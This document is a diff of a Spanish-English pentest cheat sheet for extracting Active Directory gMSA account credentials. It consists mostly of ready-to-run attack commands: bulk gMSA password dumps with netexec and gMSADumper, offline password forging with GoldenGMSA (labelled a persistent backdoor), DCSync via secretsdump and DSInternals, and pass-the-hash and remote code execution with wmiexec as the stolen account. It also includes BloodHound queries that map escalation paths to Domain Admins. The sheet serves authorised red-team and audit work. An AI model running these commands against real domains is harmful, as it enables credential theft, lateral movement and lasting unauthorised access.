@@ -3,11 +3,11 @@ aliases:
   - gMSA Tooling
   - gMSADumper
   - GoldenGMSA
-  - DSInternals
+  - DSInternals gMSA
 tags:
   - type/cheatsheet
   - vuln/ad-enumeration
-  - technique/credential-access
+  - technique/discovery
   - asset/active-directory
 primary categories: null
 secondary categories: null
@@ -23,356 +23,136 @@ linked:
 
 ## netexec / crackmapexec
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Bulk gMSA dump | `nxc ldap DC -u u -p p --gmsa` | Standard. |
-| Single domain | `nxc ldap DC -u u -p p --gmsa` | Standard. |
-| Output: gMSA + NT hash + readers | Direct cred | Standard. |
-| Combined with Kerberoasting | `--gmsa --kerberoasting` | Comprehensive. |
-| Combined with --laps | Adjacent | Adjacent. |
-| Anonymous attempt | `nxc ldap DC -u '' -p '' --gmsa` | Edge (blocked typical). |
-| crackmapexec older | Same flags | Compat. |
-| `cme ldap DC -u u -p p --gmsa` | Alias | Standard. |
-| Kerberos auth `-k -no-pass` | TGT-based | Edge. |
-| NTLM hash auth | `-H NTHASH` | Pass-the-Hash. |
-| Output to file | Standard | Reportable. |
-| Verbose `-v` | Debug | Standard. |
-| Forest-wide via different DCs | Per-domain | Standard. |
-| Combine with priv recon | Strategy | Workflow. |
-| Detection: bulk gMSA reads | Defender | Adjacent. |
-| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
+| `nxc ldap <DC> -u u -p p --gmsa` | Bulk dump (NT hash + Kerberos keys) | Standard quick. |
+| `nxc ldap <DC> -u u -p p -H <NT-hash> --gmsa` | PtH auth | Sin password. |
+| `nxc ldap <DC> -u u -p p -k --gmsa` | Kerberos auth (TGT) | OPSEC. |
+| `nxc ldap <DC> -u u -p p --query "(objectClass=msDS-GroupManagedServiceAccount)" "*"` | Discovery custom | Targeted. |
 ^ad-gmsa-tool-netexec
-
-### netexec gMSA usage
-
-```bash
-DC="dc01.dom.local"
-USER="user"; PASS="pass"
-
-# Bulk gMSA dump
-nxc ldap $DC -u $USER -p $PASS --gmsa
-
-# Output:
-# LDAP   DC  389  DC  Account: gMSA-svc01$  NTLM: aad3b435...:abc123def456
-# LDAP   DC  389  DC  PrincipalsAllowedToReadPassword: dom\IT-Servers
-
-# Combined comprehensive
-nxc ldap $DC -u $USER -p $PASS --gmsa --kerberoasting kerb.txt
-```
 
 ___
 
 ## gMSADumper (Python)
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Install | `git clone https://github.com/micahvandeusen/gMSADumper` | Source. |
-| Authenticated | `python3 gMSADumper.py -u user -p pass -d dom.local` | Standard. |
-| Specific DC | `-l DC` | Adjacent. |
-| Kerberos auth | `-k` (KRB5CCNAME) | Modern. |
-| NTLM hash auth | `-H aad3b435...:hash` | PtH. |
-| Output: NT hash + AES keys | Direct cred | Standard. |
-| Per-gMSA result | Standard | Standard. |
-| Failed reads = ACL | Per-gMSA | Standard. |
-| Cross-domain | Per-domain | Adjacent. |
-| Verbose | Debug | Standard. |
-| Modern Linux-friendly | Cross-platform | Standard. |
-| Combined with priv recon | Strategy | Standard. |
-| Output JSON-friendly format | Reportable | Standard. |
-| Detection: bulk reads | Defender | Adjacent. |
-| OPSEC: comprehensive but loud | Standard | OPSEC. |
-| Adjacent: bloodyAD modify | Edge | Adjacent. |
+| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC>` | Bulk dump cleartext + NT + Kerberos | Linux standard. |
+| `python3 gMSADumper.py -u u --hashes :NT -d corp.local -l <DC>` | PtH auth | Sin password. |
+| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC> -k -no-pass` | Kerberos | OPSEC. |
 ^ad-gmsa-tool-gmsadumper
-
-### gMSADumper usage
 
 ```bash
 git clone https://github.com/micahvandeusen/gMSADumper
-cd gMSADumper
-pip install -r requirements.txt
-
-# Authenticated
-python3 gMSADumper.py -u user -p pass -d dom.local
-
-# Output:
-# Users or groups who can read password for gMSA-svc01:
-#  > dom.local\IT-Servers
-# gMSA-svc01:::aad3b435b51404eeaad3b435b51404ee:abc123def456...
-# gMSA-svc01:aes256-cts-hmac-sha1-96:abc123...
-# gMSA-svc01:aes128-cts-hmac-sha1-96:def456...
-
-# With NT hash
-python3 gMSADumper.py -u user -H aad3b435b51404eeaad3b435b51404ee:hash -d dom.local
-
-# With Kerberos TGT
-KRB5CCNAME=/tmp/user.ccache python3 gMSADumper.py -u user -k -d dom.local
+pip install -r gMSADumper/requirements.txt
+python3 gMSADumper/gMSADumper.py -u auditor -p 'Pass!' -d corp.local -l <DC>
 ```
 
 ___
 
-## GoldenGMSA (Semperis)
+## GoldenGMSA
 
-| **Comando** | **Function** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| Install | `git clone https://github.com/Semperis/GoldenGMSA` | Source. |
-| `GoldenGMSA list` | List KDS keys + gMSAs | Standard. |
-| `GoldenGMSA compute --kdskey ... --gmsa ...` | Derive password | Standard. |
-| Required: KDS Root Key | DCSync rights typical | Adjacent. |
-| Required: msDS-ManagedPasswordId | LDAP read | Standard. |
-| Bypass msDS-GroupMSAMembership ACL | Attack vector | Critical. |
-| Modern Microsoft mitigation: rotate KDS | Best practice | Defender. |
-| Output: NT hash without ACL | Direct | Standard. |
-| Per-gMSA derive | Standard | Standard. |
-| Cross-trust: edge case | Forest scope | Edge. |
-| Detection: KDS key access events | Defender | Adjacent. |
-| Atacante OPSEC win: bypass ACL | Strategy | OPSEC. |
-| Modern: very dangerous if KDS leaked | Critical | Adjacent. |
-| Compliance: protect KDS Root Key | Best practice | Standard. |
-| Audit: KDS key access logs | Standard | Compliance. |
-| Adjacent: Microsoft DSInternals | Standard | Adjacent. |
+| `GoldenGMSA.exe gmsainfo --sid <gmsa-SID>` | Read gMSA metadata | Pre-attack. |
+| `GoldenGMSA.exe kdsinfo` | Read KDS Root Keys (priv DA) | Required para forge. |
+| `GoldenGMSA.exe compute --kdskey <key> --sid <gmsa-SID> --pwdid <managed-pwd-id>` | Compute pwd offline | **Persistent backdoor**. |
 ^ad-gmsa-tool-goldengmsa
 
-### GoldenGMSA workflow
-
 ```bash
-# Build (Windows or Linux)
-git clone https://github.com/Semperis/GoldenGMSA
-cd GoldenGMSA
-# Build with Visual Studio or dotnet
+# Download release
+wget https://github.com/Semperis/GoldenGMSA/releases/latest/download/GoldenGMSA.exe
 
-# Step 1: List KDS keys + gMSAs (privileged read)
-GoldenGMSA list
+# Pre-attack info
+GoldenGMSA.exe kdsinfo > kds.json
+GoldenGMSA.exe gmsainfo --sid S-1-5-21-... > gmsa.json
 
-# Output:
-# KDS Root Key:
-#   Guid: abc123-...
-#   EffectiveTime: 2020-01-01
-#   KdfParameters: ...
-#   SecretAgreement: ...
-# gMSAs:
-#   gMSA-svc01$  msDS-ManagedPasswordId: <blob>
-
-# Step 2: Compute password offline
-GoldenGMSA compute --kdskey kds.bin --gmsa gMSA-svc01$ --pwdid pwdid.bin
-
-# Output: NT hash + AES keys (no read ACL needed)
+# Forge offline
+GoldenGMSA.exe compute --kdskey "..." --sid "..." --pwdid "..."
 ```
 
 ___
 
 ## DSInternals (PowerShell)
 
-| **Comando** | **Function** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Install | `Install-Module DSInternals` | PSGallery. |
-| `Import-Module DSInternals` | Load | Standard. |
-| `ConvertFrom-ADManagedPasswordBlob` | Decode msDS-ManagedPassword | Standard. |
-| Returns NT hash + AES keys + cleartext | Direct | Standard. |
-| Per-blob decoding | Granular | Standard. |
-| Combine with `Get-ADServiceAccount` | Standard | Standard. |
-| `Get-ADReplAccount` | Replication-style read | Privileged. |
-| `Get-ADDBAccount` | Offline NTDS dump parsing | Adjacent. |
-| Microsoft-aware tooling | Standard | Standard. |
-| Adjacent: ntds.dit parsing | DCSync | Adjacent. |
-| Modern PowerShell preferred | Standard | Standard. |
-| Cross-correlate with offline NTDS | Standard | Adjacent. |
-| Detection: DSInternals usage | Defender | Adjacent. |
-| Compliance: red team tooling | Standard | OPSEC. |
-| Audit: PowerShell module load events | Defender | Adjacent. |
-| Modern: emerging | Standard | Standard. |
+| `Install-Module DSInternals` | Install módulo | Setup. |
+| `Get-ADReplAccount -SamAccountName 'gMSA$' -Server <DC>` | DCSync via LDAP-replication | Privileged. |
+| `ConvertFrom-ADManagedPasswordBlob $blob` | Decode `msDS-ManagedPassword` blob | Parse. |
+| `Get-ADDBAccount -All -DBPath ntds.dit -BootKey ...` | Offline NTDS parse (incluye gMSAs) | Forensic. |
+| `ConvertTo-NTHash -Password $sec` | NT hash desde SecureString | Helper. |
 ^ad-gmsa-tool-dsinternals
 
-### DSInternals usage
-
 ```powershell
-# Install
-Install-Module DSInternals -Force
 Import-Module DSInternals
 
-# Decode gMSA password blob (need authorized read access)
-$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword
-$blob = $gmsa.'msDS-ManagedPassword'
-
-ConvertFrom-ADManagedPasswordBlob $blob
-
-# Output:
-# Version : 1
-# CurrentPassword : System.Byte[]
-# Properties :
-#   ClearPassword : <unicode>
-#   NTHash : abc123def456...
-#   Aes128Key : ...
-#   Aes256Key : ...
-#   PreviousNTHash : ...
+# Read + decode gMSA blob
+$gmsa = Get-ADServiceAccount "SQL_gMSA" -Properties msDS-ManagedPassword
+$pwd = ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
+$pwd.SecureCurrentPassword | ConvertTo-NTHash
 ```
 
 ___
 
 ## Native PowerShell (RSAT)
 
-| **Comando** | **Function** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Get-ADServiceAccount -Filter *` | All gMSAs | Standard. |
-| `Get-ADServiceAccount -Identity X -Properties *` | Detail | Standard. |
-| `Install-ADServiceAccount -Identity X` | Per-host install | Privileged. |
-| `Test-ADServiceAccount -Identity X` | Verify can read | Standard. |
-| `Get-ADServiceAccount -Properties msDS-ManagedPassword` | Direct read | Standard (auto-decoded). |
-| `New-ADServiceAccount` | Create gMSA | Privileged. |
-| `Set-ADServiceAccount` | Modify gMSA | Privileged. |
-| `Remove-ADServiceAccount` | Delete gMSA | Privileged. |
-| `Add-KdsRootKey` | Create KDS key | Privileged. |
-| `Get-KdsRootKey` | List KDS keys | Privileged. |
-| Cross-domain `-Server` | Specific DC | Adjacent. |
-| `Get-ADComputer ... -Properties msDS-HostServiceAccount` | Host-side query | Standard. |
-| `Uninstall-ADServiceAccount` | Per-host uninstall | Privileged. |
-| Module: ActiveDirectory (RSAT) | Standard | Standard. |
-| Module: ADServiceAccount (subset) | Edge | Edge. |
-| Forest-wide audit | Per-domain | Standard. |
+| `Get-ADServiceAccount -Filter *` | All gMSAs/sMSAs | Inventory. |
+| `Get-ADServiceAccount <name> -Properties *` | Detail completo | Per-gMSA audit. |
+| `Get-ADServiceAccount -Filter * -Pr PrincipalsAllowedToRetrieveManagedPassword,MemberOf,ServicePrincipalName,AdminCount` | Audit attrs | Standard. |
+| `Test-ADServiceAccount <gmsa>` | Validar usable desde host | Permission test. |
+| `Install-ADServiceAccount <gmsa>` (priv) | Install on host | Setup. |
+| `Get-KdsRootKey` | KDS Root Keys (priv) | Forensic. |
 ^ad-gmsa-tool-rsat
 
-### RSAT usage
-
-```powershell
-# Comprehensive gMSA enumeration
-Get-ADServiceAccount -Filter * -Properties * |
-  Select Name,SamAccountName,
-    @{n='SPNs';e={$_.ServicePrincipalNames -join '; '}},
-    @{n='Hosts';e={$_.HostComputers -join '; '}},
-    @{n='Readers';e={$_.PrincipalsAllowedToRetrieveManagedPassword -join '; '}},
-    @{n='Groups';e={$_.MemberOf -replace 'CN=([^,]+).*','$1' -join '; '}},
-    PasswordLastSet,Enabled
-
-# Per-host: install + verify + read
-Install-ADServiceAccount -Identity gMSA-svc01
-Test-ADServiceAccount -Identity gMSA-svc01
-
-# Direct read (if authorized)
-$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword
-$gmsa.'msDS-ManagedPassword'  # binary blob (auto-decoded)
-```
-
 ___
 
-## BloodHound gMSA Edges
+## BloodHound gMSA
 
-| **Edge** | **Significado** | **Notas** |
+| **Cypher** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `ReadGMSAPassword` | Direct password read | Modern. |
-| `MemberOf` chain to gMSA reader | Indirect | Standard. |
-| `GenericAll` → gMSA | Full control | Privesc combo. |
-| `GenericWrite` → gMSA | Modify readers | Privesc combo. |
-| `WriteDACL` → gMSA | Self-grant | Privesc combo. |
-| Cypher: find gMSA readers | `MATCH (u)-[:ReadGMSAPassword]->(g)` | Standard. |
-| Cypher: priv gMSA paths | `WHERE g.adminCount=true` | Targeted. |
-| BloodHound CE 5.x+ gMSA support | Modern | Tool. |
-| RustHound gMSA collection | Modern | Tool. |
-| BloodHound.py gMSA | `-c GMSA` | Linux. |
-| Per-domain ingest | Multi-domain | Adjacent. |
-| Custom analytics | Cypher | Tool. |
-| Visual graph | Helpful | Standard. |
-| Detection: BloodHound collection events | Defender | Adjacent. |
-| Audit baseline | Modern | Standard. |
-| Cross-correlate priv | Cypher | Standard. |
+| `MATCH (s {gmsa:true}) RETURN s.name,s.domain` | All gMSAs | Inventory. |
+| `MATCH (u {owned:true})-[:ReadGMSAPassword*1..]->(s) RETURN u.name,s.name` | Paths owned → gMSA read | Privesc. |
+| `MATCH (s {gmsa:true})-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN s.name,g.name` | gMSAs en Tier 0 | Critical. |
+| `MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:ReadGMSAPassword]->(s) RETURN u,g,s` | Recursive readers | Detail. |
 ^ad-gmsa-tool-bh
 
-### BloodHound gMSA Cypher
-
-```cypher
-// All gMSA readers
-MATCH p=(u)-[:ReadGMSAPassword|MemberOf*1..]->(g:User)
-WHERE g.gmsa = true
-RETURN p
-
-// Priv gMSAs + readers
-MATCH (g:User {gmsa: true, adminCount: true})
-MATCH p=(u)-[:ReadGMSAPassword|MemberOf*1..]->(g)
-RETURN u.name, g.name, p
-
-// Foreign principals reading priv gMSA (cross-trust)
-MATCH (u)-[:ReadGMSAPassword|MemberOf*1..]->(g:User {gmsa: true})
-WHERE u.domain <> g.domain
-RETURN u.name, g.name
-
-// Path: owned → gMSA → DA via gMSA membership
-MATCH (owned {owned: true}), (g:User {gmsa: true})
-MATCH p1=shortestPath((owned)-[:ReadGMSAPassword|MemberOf*1..]->(g))
-MATCH p2=shortestPath((g)-[:MemberOf*1..]->(:Group {name: "DOMAIN ADMINS@DOM.LOCAL"}))
-RETURN p1, p2
+```bash
+# SharpHound captures gMSA edges automáticamente
+.\SharpHound.exe -c All
+# o
+bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
 ```
 
 ___
 
-## Linux / Impacket Tools
+## Linux / Impacket
 
-| **Tool** | **Use** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `bloodhound-python -c GMSA` | Linux BH collector | Standard. |
-| `windapsearch --gmsa` | Wrapper | Helper. |
-| `ldapdomaindump` | HTML report includes gMSA | Standard. |
-| `gMSADumper.py` | Direct gMSA dump | Standard. |
-| `bloodyAD` | LDAP modify gMSA | Privileged. |
-| `nxc ldap DC --gmsa` | netexec | Standard. |
-| `pylaps` (community) | Edge | Edge. |
-| `impacket-secretsdump --just-dc` | Adjacent (gMSA in NTDS) | Adjacent. |
-| Custom Python LDAP | DIY | Flexible. |
-| `ldap3` Python lib | Custom | Standard. |
-| `pywerview` get-netuser | Adjacent | Adjacent. |
-| `manspider` (file share spider) | Adjacent | Edge. |
-| `kerberoast.py` | Kerberoast adjacent | Adjacent. |
-| Detection: bulk Linux gMSA reads | Defender | Adjacent. |
-| Modern: BHCE 6.x preferred | Modern | Tool. |
-| Compliance: red team scoped | Standard | OPSEC. |
+| `python3 gMSADumper.py -u u -p pass -d corp.local -l <DC>` | Standard Linux dump | Standard. |
+| `secretsdump.py corp.local/admin:pass@<DC> -just-dc-user '<gMSA>$'` | DCSync gMSA hash (priv) | Privileged. |
+| `bloodyAD --host <DC> -d corp -u u -p pass get object '<gMSA-DN>' --attr msDS-ManagedPassword` | Raw blob | Linux read. |
+| `getTGT.py corp.local/'<gMSA>$' -hashes :<NT> -dc-ip <DC>` | TGT como gMSA | Auth post-dump. |
+| `wmiexec.py -hashes :<NT> 'corp.local/<gMSA>$@<target>'` | RCE como gMSA | Lateral. |
 ^ad-gmsa-tool-linux
 
-### Linux gMSA pipeline
-
-```bash
-DC="dc01.dom.local"
-USER="user"; PASS="pass"
-DOM="dom.local"
-
-# bloodhound-python with gMSA
-bloodhound-python -d $DOM -u $USER -p $PASS -ns $DC -c All --zip
-
-# windapsearch
-python3 windapsearch.py -d $DOM -u $USER -p $PASS --dc $DC --gmsa
-
-# Custom Python
-python3 -c "
-from ldap3 import Server, Connection, ALL, NTLM
-s = Server('$DC', get_info=ALL)
-c = Connection(s, user='$DOM\\$USER', password='$PASS', authentication=NTLM)
-c.bind()
-c.search('CN=Managed Service Accounts,DC=dom,DC=local',
-         '(objectClass=msDS-GroupManagedServiceAccount)',
-         attributes=['cn','samAccountName','servicePrincipalName','msDS-GroupMSAMembership'])
-for entry in c.entries:
-    print(entry)
-"
-```
-
 ___
 
-## Wordlists & Recursos
+## Recursos
 
-| **Recurso** | **URL / Path** | **Notas** |
-|:---:|:---:|:---:|
-| HackTricks - gMSA | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/gmsa` | Reference. |
-| The Hacker Recipes - gMSA | `thehacker.recipes/ad/movement/access-control/gmsa` | Comprehensive. |
-| Microsoft - gMSA Documentation | `learn.microsoft.com` | Vendor. |
-| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
-| gMSADumper repo | `github.com/micahvandeusen/gMSADumper` | Tool. |
-| GoldenGMSA repo | `github.com/Semperis/GoldenGMSA` | Tool. |
-| DSInternals docs | `github.com/MichaelGrafnetter/DSInternals` | Tool. |
-| Sean Metcalf - gMSA | `adsecurity.org` | Defender intel. |
-| Will Schroeder - gMSA Research | Specter Ops blog | Adversary research. |
-| Microsoft KDS Root Key docs | learn.microsoft.com | Vendor. |
-| Modern AD: gMSA best practices | Microsoft | Hardening. |
-| MITRE ATT&CK T1003 | Credential Access | Adjacent. |
-| BloodHound GMSA edge | Modern | Tool. |
-| `awesome-active-directory` | GitHub | Foundation. |
-| Compliance: NIST recommend gMSA | Best practice | Standard. |
-| Microsoft Defender for Identity gMSA alerts | Modern | Defender. |
+| **Recurso** | **URL** |
+|:---:|:---:|
+| gMSADumper | `https://github.com/micahvandeusen/gMSADumper` |
+| GoldenGMSA | `https://github.com/Semperis/GoldenGMSA` |
+| DSInternals | `https://github.com/MichaelGrafnetter/DSInternals` |
+| Microsoft gMSA docs | `https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview` |
+| MS-GKDI spec (KDS / gMSA crypto) | `https://learn.microsoft.com/openspecs/windows_protocols/ms-gkdi/` |
+| HackTricks gMSA | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/account-persistence` |
+| Akamai BadSuccessor (dMSA abuse) | `https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory` |
+| The Hacker Recipes — gMSA | `https://www.thehacker.recipes/ad/movement/credentials/dumping/gmsa` |
 ^ad-gmsa-tool-resources
 
 ***
